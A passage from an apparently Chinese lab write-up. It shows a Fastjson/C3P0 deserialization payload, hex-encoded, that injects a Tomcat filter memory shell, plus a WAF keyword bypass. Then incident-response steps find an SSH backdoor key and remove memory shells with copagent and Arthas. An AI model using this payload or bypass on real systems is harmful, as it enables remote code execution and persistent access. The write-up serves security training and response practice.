IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bao);</span><br><span class="line">        oos.writeObject(o);   <span class="comment">//</span></span><br><span class="line">        <span class="keyword">return</span> bao.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//字节数组转十六进制</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">bytesToHex</span><span class="params">(<span class="type">byte</span>[] bytes)</span> &#123;</span><br><span class="line">        <span class="type">StringBuffer</span> <span class="variable">stringBuffer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; bytes.length; i++) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">hex</span> <span class="operator">=</span> Integer.toHexString(bytes[i] &amp; <span class="number">0xff</span>);      <span class="comment">//bytes[]中为带符号字节-255~+255，&amp;0xff: 保证得到的数据在0~255之间</span></span><br><span class="line">            <span class="keyword">if</span> (hex.length()&lt;<span class="number">2</span>)&#123;</span><br><span class="line">                stringBuffer.append(<span class="string">&quot;0&quot;</span> + hex);   <span class="comment">//0-9 则在前面加‘0’,保证2位避免后面读取错误</span></span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                stringBuffer.append(hex);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> stringBuffer.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行exp即可生成一段json数据：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;a&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;\u0040\u0074\u0079\u0070\u0065&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;b&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;\u0040\u0074\u0079\u0070\u0065&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;userOverridesAsString&quot;</span><span class="punctuation">:</span><span class="string">&quot;HexAsciiSerializedMap:aced0005737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000c770800000010000000017372003a636f6d2e73756e2e6f72672e6170616368652e78616c616e2e696e7465726e616c2e78736c74632e747261782e54656d706c61746573496d706c09574fc16eacab3303000649000d5f696e64656e744e756d62657249000e5f7472616e736c6574496e6465785b000a5f62797465636f6465737400035b5b425b00065f636c6173737400125b4c6a6176612f6c616e672f436c6173733b4c00055f6e616d657400124c6a6176612f6c616e672f537472696e673b4c00115f6f757470757450726f706572746965737400164c6a6176612f7574696c2f50726f706572746965733b787000000000ffffffff757200035b5b424bfd19156767db37020000787000000001757200025b42acf317f8060854e00200007870000024e4cafebabe0000003401870a005e00cb0800cc09004b00cd0700ce0700cf0b000400d00700d10a000700cb08007e0b004900d208007a08007c0a00d300d40a00d300d50b000400d60800d70a00d800d90a002400da0a001c00db0a001c00dc0800dd0a004b00de0b00df00e00a00e100e20800e30a00e400e50800e60700e70700a30900e800e90a001c00ea0a00eb00ec0800ed0a002700ee0700ef0700f00a00e800f10a00eb00f20700f30a001c00f40a00f500ec0a001c00f60a00f500f70800f808009c0b00f900fa0800fb0a00fc00fd0700fe0a00d800ff0a003101000a00fc01010701020a003500cb0b000401030a010401050a003501060a00fc01070a001c010808010907010a08010b07010c0a003f010d0b010e010f0701100801110a001c01120800c80a001c01130a011400ec0a011401150701160b004901150701170a004b00cb0701180a004d00cb0a004d01190a004d011a0a004d011b0a0042011c07011d0a005300cb08011e0a0053011f0a0053011a09012001210a012001220a005301230a0042012407012507012607012707012801000270610100124c6a6176612f6c616e672f537472696e673b01000d436f6e7374616e7456616c75650100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c650100047468697301000e4c7365632f4963655368656c6c3b010004696e697401001f284c6a617661782f736572766c65742f46696c746572436f6e6669673b295601000c66696c746572436f6e66696701001c4c6a617661782f736572766c65742f46696c746572436f6e6669673b01000a457863657074696f6e73070129010008646f46696c74657201005b284c6a617661782f736572766c65742f536572766c6574526571756573743b4c6a617661782f736572766c65742f536572766c6574526573706f6e73653b4c6a617661782f736572766c65742f46696c746572436861696e3b29560100064c636c6173730100114c6a6176612f6c616e672f436c6173733b01000e736572766c65745265717565737401001e4c6a617661782f736572766c65742f536572766c6574526571756573743b01000f736572766c6574526573706f6e736501001f4c6a617661782f736572766c65742f536572766c6574526573706f6e73653b01000b66696c746572436861696e01001b4c6a617661782f736572766c65742f46696c746572436861696e3b010007726571756573740100274c6a617661782f736572766c65742f687474702f48747470536572766c6574526571756573743b010008726573706f6e73650100284c6a617661782f736572766c65742f687474702f48747470536572766c6574526573706f6e73653b01000773657373696f6e0100204c6a617661782f736572766c65742f687474702f4874747053657373696f6e3b01000b70616765436f6e7465787401000f4c6a6176612f7574696c2f4d61703b010002636c0100174c6a6176612f6c616e672f436c6173734c6f616465723b0100164c6f63616c5661726961626c65547970655461626c650100354c6a6176612f7574696c2f4d61703c4c6a6176612f6c616e672f537472696e673b4c6a6176612f6c616e672f4f626a6563743b3e3b01000d537461636b4d61705461626c6507011707012a07012b07012c0700ce0700cf07012d0701160700f30700e707012e01000764657374726f79010009527573685468657265010081284c6a6176612f6c616e672f436c6173733b4c6a6176612f6c616e672f436c6173734c6f616465723b4c6a617661782f736572766c65742f687474702f4874747053657373696f6e3b4c6a617661782f736572766c65742f687474702f48747470536572766c6574526571756573743b4c6a6176612f7574696c2f4d61703b295601000576617231380100224c6a6176612f6c616e672f436c6173734e6f74466f756e64457863657074696f6e3b010006646566696e6501001a4c6a6176612f6c616e672f7265666c6563742f4d6574686f643b01000675636c61737301000b636f6e7374727563746f7201001f4c6a6176612f6c616e672f7265666c6563742f436f6e7374727563746f723b010001750100124c6a6176612f6c616e672f4f626a6563743b010002556d0100016b010001630100154c6a617661782f63727970746f2f4369706865723b01000b65436c61737342797465730100025b4201000665636c617373010001610100016201000862797465636f646507012f0700ef07010a0100095369676e61747572650100a7284c6a6176612f6c616e672f436c6173733b4c6a6176612f6c616e672f436c6173734c6f616465723b4c6a617661782f736572766c65742f687474702f4874747053657373696f6e3b4c6a617661782f736572766c65742f687474702f48747470536572766c6574526571756573743b4c6a6176612f7574696c2f4d61703c4c6a6176612f6c616e672f537472696e673b4c6a6176612f6c616e672f4f626a6563743b3e3b29560100097472616e73666f726d010072284c636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f444f4d3b5b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b2956010008646f63756d656e7401002d4c636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f444f4d3b01000868616e646c6572730100425b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b0701300100a6284c636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f444f4d3b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f64746d2f44544d417869734974657261746f723b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b29560100086974657261746f720100354c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f64746d2f44544d417869734974657261746f723b01000768616e646c65720100414c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b0100083c636c696e69743e01000666696c7465720100164c6a617661782f736572766c65742f46696c7465723b01000966696c7465724465660100314c6f72672f6170616368652f746f6d6361742f7574696c2f64657363726970746f722f7765622f46696c7465724465663b01000966696c7465724d61700100314c6f72672f6170616368652f746f6d6361742f7574696c2f64657363726970746f722f7765622f46696c7465724d61703b0100324c6f72672f6170616368652f636174616c696e612f636f72652f4170706c69636174696f6e46696c746572436f6e6669673b0100046e616d65010015776562617070436c6173734c6f61646572426173650100324c6f72672f6170616368652f636174616c696e612f6c6f616465722f576562617070436c6173734c6f61646572426173653b01000f7374616e64617264436f6e7465787401002a4c6f72672f6170616368652f636174616c696e612f636f72652f5374616e64617264436f6e746578743b010007436f6e666967730100194c6a6176612f6c616e672f7265666c6563742f4669656c643b01000d66696c746572436f6e6669677301000a536f7572636546696c6501000d4963655368656c6c2e6a6176610c00630064010010336164326664646665386261643865360c006000610100256a617661782f736572766c65742f687474702f48747470536572766c6574526571756573740100266a617661782f736572766c65742f687474702f48747470536572766c6574526573706f6e73650c013101320100116a6176612f7574696c2f486173684d61700c013301340701350c013601370c013801390c013a013b010004504f535407013c0c0109013d0c013e013f0c0140013f0c0141013b0100156a6176612e6c616e672e436c6173734c6f616465720c0093009407012c0c007001420701430c0144014701026479763636766741414144514147676f41424141554367414541425548414259484142634241415938615735706444344241426f6f54477068646d4576624746755a7939446247467a633078765957526c636a73705667454142454e765a4755424141394d6157356c546e5674596d5679564746696247554241424a4d62324e6862465a68636d6c68596d786c56474669624755424141523061476c7a415141445446553741514142597745414630787159585a684c327868626d63765132786863334e4d6232466b5a584937415141425a7745414653686251696c4d616d4632595339735957356e4c304e7359584e7a4f7745414157494241414a6251674541436c4e7664584a6a5a555a706247554241415a564c6d7068646d454d41415541426777414741415a415141425651454146577068646d4576624746755a7939446247467a633078765957526c636745414332526c5a6d6c755a554e7359584e7a415141584b46744353556b7054477068646d4576624746755a7939446247467a637a734149514144414151414141414141414941414141464141594141514148414141414f67414341414941414141474b6975334141477841414141416741494141414142674142414141414167414a4141414146674143414141414267414b4141734141414141414159414441414e414145414151414f41413841415141484141414150514145414149414141414a4b6973444b37363341414b7741414141416741494141414142674142414141414177414a4141414146674143414141414351414b414173414141414141416b4145414152414145414151415341414141416741540701480c0149014a01000b646566696e65436c61737301000f6a6176612f6c616e672f436c61737307014b0c014c00730c014d014e07012f0c014f0150010001550c015101520100206a6176612f6c616e672f436c6173734e6f74466f756e64457863657074696f6e0100106a6176612f6c616e672f4f626a6563740c015301540c015501560100156a6176612f6c616e672f436c6173734c6f616465720c015701580701590c015a01390c015b015c0100016707012d0c015d015e01000341455307015f0c0160016101001f6a617661782f63727970746f2f737065632f5365637265744b6579537065630c016201630c006301640c006a016501001673756e2f6d6973632f4241534536344465636f6465720c016601670701680c0169013b0c016a014a0c016b016c0c015b016d010006657175616c730100136a6176612f6c616e672f457863657074696f6e01000c4175746f6d6e6547726565740100306f72672f6170616368652f636174616c696e612f6c6f616465722f576562617070436c6173734c6f61646572426173650c016e016f0701700c017101720100286f72672f6170616368652f636174616c696e612f636f72652f5374616e64617264436f6e746578740100286f72672e6170616368652e636174616c696e612e636f72652e5374616e64617264436f6e746578740c017301520c017401750701760c0177017801000d6a6176612f7574696c2f4d617001000c7365632f4963655368656c6c01002f6f72672f6170616368652f746f6d6361742f7574696c2f64657363726970746f722f7765622f46696c7465724465660c0179017a0c017b017c0c017d017c0c017e017f01002f6f72672f6170616368652f746f6d6361742f7574696c2f64657363726970746f722f7765622f46696c7465724d61700100062f7368656c6c0c0180017c0701810c018201830c00c1013b0c0184017c0c018501860100306f72672f6170616368652f636174616c696e612f636f72652f4170706c69636174696f6e46696c746572436f6e66696701001b6f72672f6170616368652f636174616c696e612f436f6e74657874010040636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f72756e74696d652f41627374726163745472616e736c65740100146a617661782f736572766c65742f46696c74657201001e6a617661782f736572766c65742f536572766c6574457863657074696f6e01001c6a617661782f736572766c65742f536572766c65745265717565737401001d6a617661782f736572766c65742f536572766c6574526573706f6e73650100196a617661782f736572766c65742f46696c746572436861696e01001e6a617661782f736572766c65742f687474702f4874747053657373696f6e0100136a6176612f696f2f494f457863657074696f6e0100186a6176612f6c616e672f7265666c6563742f4d6574686f64010039636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f5472616e736c6574457863657074696f6e01000a67657453657373696f6e01002228294c6a617661782f736572766c65742f687474702f4874747053657373696f6e3b010003707574010038284c6a6176612f6c616e672f4f626a6563743b4c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b0100106a6176612f6c616e672f54687265616401000d63757272656e7454687265616401001428294c6a6176612f6c616e672f5468726561643b010015676574436f6e74657874436c6173734c6f6164657201001928294c6a6176612f6c616e672f436c6173734c6f616465723b0100096765744d6574686f6401001428294c6a6176612f6c616e672f537472696e673b0100106a6176612f6c616e672f537472696e67010015284c6a6176612f6c616e672f4f626a6563743b295a010008676574436c61737301001328294c6a6176612f6c616e672f436c6173733b01000d6765745375706572636c6173730100076765744e616d65010040284c6a617661782f736572766c65742f536572766c6574526571756573743b4c6a617661782f736572766c65742f536572766c6574526573706f6e73653b29560100106a6176612f7574696c2f42617365363401000a6765744465636f6465720100074465636f64657201000c496e6e6572436c617373657301001c28294c6a6176612f7574696c2f426173653634244465636f6465723b0100186a6176612f7574696c2f426173653634244465636f6465720100066465636f6465010016284c6a6176612f6c616e672f537472696e673b295b420100116a6176612f6c616e672f496e7465676572010004545950450100116765744465636c617265644d6574686f64010040284c6a6176612f6c616e672f537472696e673b5b4c6a6176612f6c616e672f436c6173733b294c6a6176612f6c616e672f7265666c6563742f4d6574686f643b01000d73657441636365737369626c65010004285a29560100096c6f6164436c617373010025284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f436c6173733b01000776616c75654f660100162849294c6a6176612f6c616e672f496e74656765723b010006696e766f6b65010039284c6a6176612f6c616e672f4f626a6563743b5b4c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b0100166765744465636c61726564436f6e7374727563746f72010033285b4c6a6176612f6c616e672f436c6173733b294c6a6176612f6c616e672f7265666c6563742f436f6e7374727563746f723b01001d6a6176612f6c616e672f7265666c6563742f436f6e7374727563746f7201000e676574436c6173734c6f6164657201000b6e6577496e7374616e6365010027285b4c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b01000c736574417474726962757465010027284c6a6176612f6c616e672f537472696e673b4c6a6176612f6c616e672f4f626a6563743b29560100136a617661782f63727970746f2f43697068657201000b676574496e7374616e6365010029284c6a6176612f6c616e672f537472696e673b294c6a617661782f63727970746f2f4369706865723b010008676574427974657301000428295b42010017285b424c6a6176612f6c616e672f537472696e673b295601001728494c6a6176612f73656375726974792f4b65793b295601000967657452656164657201001a28294c6a6176612f696f2f42756666657265645265616465723b0100166a6176612f696f2f4275666665726564526561646572010008726561644c696e6501000c6465636f6465427566666572010007646f46696e616c010006285b42295b4201001428294c6a6176612f6c616e672f4f626a6563743b01000c6765745265736f757263657301002728294c6f72672f6170616368652f636174616c696e612f5765625265736f75726365526f6f743b0100236f72672f6170616368652f636174616c696e612f5765625265736f75726365526f6f7401000a676574436f6e7465787401001f28294c6f72672f6170616368652f636174616c696e612f436f6e746578743b010007666f724e616d650100106765744465636c617265644669656c6401002d284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f7265666c6563742f4669656c643b0100176a6176612f6c616e672f7265666c6563742f4669656c64010003676574010026284c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b01000973657446696c746572010019284c6a617661782f736572766c65742f46696c7465723b295601000d73657446696c7465724e616d65010015284c6a6176612f6c616e672f537472696e673b295601000e73657446696c746572436c61737301000c61646446696c746572446566010034284c6f72672f6170616368652f746f6d6361742f7574696c2f64657363726970746f722f7765622f46696c7465724465663b295601000d61646455524c5061747465726e01001c6a617661782f736572766c65742f44697370617463686572547970650100075245515545535401001e4c6a617661782f736572766c65742f44697370617463686572547970653b01000d7365744469737061746368657201001261646446696c7465724d61704265666f7265010034284c6f72672f6170616368652f746f6d6361742f7574696c2f64657363726970746f722f7765622f46696c7465724d61703b29560021004b005e0001005f0001001200600061000100620000000200020008000100630064000100650000003d000200010000000b2ab700012a1202b50003b10000000200660000000e00030000002600040024000a002700670000000c00010000000b0068006900000001006a006b00020065000000350000000200000001b10000000200660000000600010000002a00670000001600020000000100680069000000000001006c006d0001006e000000040001006f00010070007100020065000003180006000a000001ab2bc000043a042cc000053a051904b9000601003a06bb000759b700083a07190712091906b9000a0300571907120b1904b9000a0300571907120c1905b9000a030057b8000db6000e3a081904b9000f01001210b600119901541908b60012b60013b600141215b6001199001e1908b60012b600133a092a19091908190619041907b60016a7011e1908b60012b60013b60013b600141215b600119900211908b60012b60013b600133a092a19091908190619041907b60016a700ea1908b60012b60013b60013b60013b600141215b600119900241908b60012b60013b60013b600133a092a19091908190619041907b60016a700b01908b60012b60013b60013b60013b60013b600141215b600119900271908b60012b60013b60013b60013b600133a092a19091908190619041907b60016a700701908b60012b60013b60013b60013b60013b60013b600141215b6001199002a1908b60012b60013b60013b60013b60013b600133a092a19091908190619041907b60016a7002a1908b60012b60013b60013b60013b60013b60013b600133a092a19091908190619041907b600162d2b2cb900170300b100000004006600000072001c0000002d0006002e000c002f00150030001e0031002a00320036003300420034004a003500590037006c0038007600390087003a009d003b00aa003c00bb003d00d4003e00e4003f00f5004001110041012400420135004301540044016a0045017b00470194004801a2004b01aa004e006700000098000f0076001100720073000900aa001100720073000900e4001100720073000901240011007200730009016a001100720073000901940016007200730009000001ab006800690000000001ab007400750001000001ab007600770002000001ab007800790003000601a5007a007b0004000c019f007c007d000500150196007e007f0006001e018d008000810007004a016100820083000800840000000c0001001e018d0080008500070086000000330007ff0087000907008707008807008907008a07008b07008c07008d07008e07008f000033393ffb0045fc0026070090fa0007006e0000000600020091006f000100920064000100650000002b0000000100000001b10000000200660000000600010000005100670000000c00010000000100680069000000010093009400020065000002e50006001200000133b800181219b6001a3a062b121b06bd001c5903121d535904b2001e535905b2001e53b6001f3a07190704b60020013a082c1221b600223a08a700293a0919072c06bd00245903190653590403b800255359051906beb8002553b60026c0001c3a08190804bd001c5903122753b600283a09190904b60029190904bd002459032ab60012b6002a53b6002b3a0a1908122c04bd001c5903121d53b6001f3a0b190b04b6002012023a0c2d122d190cb9002e0300122fb800303a0d190d05bb003159190cb60032122fb70033b60034190dbb003559b700361904b900370100b60038b60039b6003a3a0e190b190a04bd00245903190e53b60026c0001c3a0f190fb6003b3a10190f123c04bd001c5903122453b6001f3a11191104b600201911191004bd00245903190553b6002657a700053a07b1000200300038003b0023000a012d0130003d000400660000006a001a00000054000a005700270058002d00590030005c0038005f003b005d003d005e006100610071006200770063008c0064009e006500a4006600a8006700b2006800b9006900cd006a00e8006b00fd006c0104006d0116006e011c006f012d007101300070013200730067000000c00013003d002400950096000900270106009700980007003000fd009900730008007100bc009a009b0009008c00a1009c009d000a009e008f009e0098000b00a80085009f0061000c00b9007400a000a1000d00e8004500a200a3000e00fd003000a40073000f0104002900a5009d00100116001700a60098001100000133006800690000000001330072007300010000013300820083000200000133007e007f000300000133007a007b000400000133008000810005000a012900a700a3000600840000000c0001000001330080008500050086000000480004ff003b000907008707009007008f07008d07008b07008e07001d0700a807009000010700a925ff00ce000707008707009007008f07008d07008b07008e07001d00010700aa0100ab0000000200ac000100ad00ae000200650000003f0000000300000001b1000000020066000000060001000000760067000000200003000000010068006900000000000100af00b000010000000100b100b20002006e00000004000100b3000100ad00b400020065000000490000000400000001b10000000200660000000600010000007900670000002a0004000000010068006900000000000100af00b000010000000100b500b600020000000100b700b80003006e00000004000100b3000800b9006400010065000001da0005000a000000de123e4bb8000db6000ec0003f4c2bb60040b900410100c000424d1243b800441245b600464e2d04b600472d2cb60048c000493a041904123eb9004a0200c7009cbb004b59b7004c3a05bb004d59b7004e3a0619061905b6004f1906123eb6005019061905b60012b60014b600512c1906b60052bb005359b700543a0719071255b600561907123eb600571907b20058b60059b6005a2c1907b6005b125c05bd001c5903125d535904124d53b600283a08190804b60029190805bd002459032c535904190653b6002bc0005c3a091904123e1909b9000a030057a700044bb10001000000d900dc003d000300660000006600190000007d0003007e000d007f001a008000250081002a0082003400830040008400490085005200860059008700600088006d00890073008a007c008b0083008c008a008d0095008e009b008f00b0009000b6009100cd009200d9009500dc009400dd0097006700000066000a0049009000ba00bb00050052008700bc00bd0006007c005d00be00bf000700b00029009a009b000800cd000c006c00c00009000300d600c100610000000d00cc00c200c30001001a00bf00c400c50002002500b400c600c70003003400a500c80081000400860000000a0003fb00d9420700aa00000200c90000000200ca01460000000a000100e400e101450009707400013170770100787372002e6a617661782e6d616e6167656d656e742e42616441747472696275746556616c7565457870457863657074696f6ed4e7daab632d46400200014c000376616c7400124c6a6176612f6c616e672f4f626a6563743b787200136a6176612e6c616e672e457863657074696f6ed0fd1f3e1a3b1cc4020000787200136a6176612e6c616e672e5468726f7761626c65d5c635273977b8cb0300044c000563617573657400154c6a6176612f6c616e672f5468726f7761626c653b4c000d64657461696c4d65737361676571007e00055b000a737461636b547261636574001e5b4c6a6176612f6c616e672f537461636b5472616365456c656d656e743b4c001473757070726573736564457863657074696f6e737400104c6a6176612f7574696c2f4c6973743b787071007e0014707572001e5b4c6a6176612e6c616e672e537461636b5472616365456c656d656e743b02462a3c3cfd22390200007870000000027372001b6a6176612e6c616e672e537461636b5472616365456c656d656e746109c59a2636dd8502000449000a6c696e654e756d6265724c000e6465636c6172696e67436c61737371007e00054c000866696c654e616d6571007e00054c000a6d6574686f644e616d6571007e00057870000000297400087365632e43335030740009433350302e6a61766174000367656e7371007e00170000001171007e001971007e001a7400046d61696e737200266a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c654c697374fc0f2531b5ec8e100200014c00046c69737471007e00137872002c6a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c65436f6c6c656374696f6e19420080cb5ef71e0200014c0001637400164c6a6176612f7574696c2f436f6c6c656374696f6e3b7870737200136a6176612e7574696c2e41727261794c6973747881d21d99c7619d03000149000473697a657870000000007704000000007871007e0023787372001e636f6d2e616c69626162612e666173746a736f6e2e4a534f4e417272617900000000000000010200014c00046c69737471007e001378707371007e00220000000177040000000171007e00077878;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>直接打会发现再次被拦了，说明过滤的userOverridesAsString</p>
<p><img src="/../imgs/vulntarget-m47.png"></p>
<p>直接对其Unicode编码绕过发现还是无法绕过，不过可以通过添加<code>_</code>或<code>+</code>处理关键字绕过</p>
<blockquote>
<p>可参考：<a target="_blank" rel="noopener" href="https://y4tacker.github.io/2022/03/30/year/2022/3/%E6%B5%85%E8%B0%88Fastjson%E7%BB%95waf/">https://y4tacker.github.io/2022/03/30/year/2022/3/%E6%B5%85%E8%B0%88Fastjson%E7%BB%95waf/</a></p>
</blockquote>
<p><img src="/../imgs/vulntarget-m48.png"></p>
<p>出现上述报错则说明内存马注入成功</p>
<p><img src="/../imgs/vulntarget-m49.png"></p>
<h3 id="应急响应Ⅲ"><a href="#应急响应Ⅲ" class="headerlink" title="应急响应Ⅲ"></a><strong>应急响应Ⅲ</strong></h3><p>首先排查隐藏用户、端口、进程等并无异常，接着发现存在ssh后门，直接删除即可</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/home/vulntarget/ &gt;cat ~/.ssh/authorized_keys</span><br><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEisTimbKUHUXBUJUo4WbOxTQY9VHM1ZaL35RQgBTwNUWlm353XdHcq8HxA1U9MLp/Lepaw/U5tQ5Y2qF9TzhAUoTiAiwAKREFuLHugeL/eWTyZAnRN/<span class="number">2</span>OQ4XX5IBsMDFbZAvNRUSaOLIAtpNz/ZFj1NDuCWR7p/<span class="number">2</span>EYFB0YvHxaS9OWrUb0Zh21GOQR6apCYY/+IbVVGKr+MwlI0Df0kv7hns9IpapwEctI0rzayL+NYtvFUyterTV4HfnPij7LxyGqK62ZEsJOQSnON+mj1Dp6Ukz1krdUoVmxrEseQe6CJemq3BHolDi7zbQo4BbxnTQUYwzl9li04ZL2h75xQuUEPb6nxVanUEEJ7CT/fIclvCHsdO9MJ5l2V8ROetkukslKlPxEVZ8q2Up1S4SQk90cYLLnj2+wJNSNw343kIOrIjtQY8E16RhVqVMMGmKW5Ui/FU6X/lfKjISjxqBN6HB65Q74ISMD+IN3kVPSI52rwqaea5/TdjKiDxzkO8bAXU= hacker@anonymous</span><br></pre></td></tr></table></figure>

<p>其次在&#x2F;var&#x2F;local&#x2F;目录下也有个app.jar，下载下来反编译看看并未发现异常</p>
<p><img src="/../imgs/vulntarget-m50.png"></p>
<p>拿D盾检测也没发现异常文件</p>
<p><img src="/../imgs/vulntarget-m51.png"></p>
<p>然后用copagent工具检测，运行后会识别正在运行的应用，输入对应ID，会在同目录下生成.copagent目录储存结果</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/LandGrey/copagent/raw/release/cop.jar">https://github.com/LandGrey/copagent/raw/release/cop.jar</a></p>
</blockquote>
<p><img src="/../imgs/vulntarget-m52.png"></p>
<p>result.txt中记录所有的类及危险等级</p>
<p><img src="/../imgs/vulntarget-m53.png"></p>
<p>在class目录下会保存木马以及运行的类</p>
<p><img src="/../imgs/vulntarget-m54.png"></p>
<p>还原出内存马（IceShell是我自己打进去的可以排除掉，剩下就是异常的</p>
<p>ShellServlet存在很明显的exec</p>
<p><img src="/../imgs/vulntarget-m55.png"></p>
<p>HttpServlet也不难看出很有可能就是内存马</p>
<p><img src="/../imgs/vulntarget-m56.png"></p>
<p>还可以拿D盾来扫描检查</p>
<p><img src="/../imgs/vulntarget-m57.png"></p>
<p>这里热更新我们换一种方式，直接利用Arthas工具反编译并提取<code>ShellServlet</code>类的代码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jad --source-only ShellServlet &gt; /tmp/ShellServlet.java</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/vulntarget-m58.png"></p>
<p>接着去&#x2F;tmp目录下找到ShellServlet.java进行修改</p>
<p><img src="/../imgs/vulntarget-m59.png"></p>
<p>然后直接让他的类加载器去编译，再去热更新即可</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sc -d *ShellServlet | grep classLoaderHash</span><br><span class="line">mc -c 56ae04b4 /tmp/ShellServlet.java -d /var/</span><br><span class="line">retransform /var/ShellServlet.class </span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/vulntarget-m60.png"></p>
<p>同理对<code>HttpServlet</code>类进行热更新</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">jad --source-only ShellServlet &gt; /tmp/ShellServlet.java</span><br><span class="line"></span><br><span class="line">vim /tmp/HttpServlet.java</span><br><span class="line"></span><br><span class="line">sc -d *HttpServlet | grep classLoaderHash</span><br><span class="line">mc -c 49c2faae /tmp/HttpServlet.java -d /var/</span><br><span class="line">retransform /var/javax/servlet/http/HttpServlet.class</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/vulntarget-m61.png"></p>
<p><img src="/../imgs/vulntarget-m62.png"></p>
<p>应急成功，拿下flag3：flag{57f92fa987141af1770d2b0ca894960f}</p>
<p><img src="/../imgs/vulntarget-m63.png"></p>
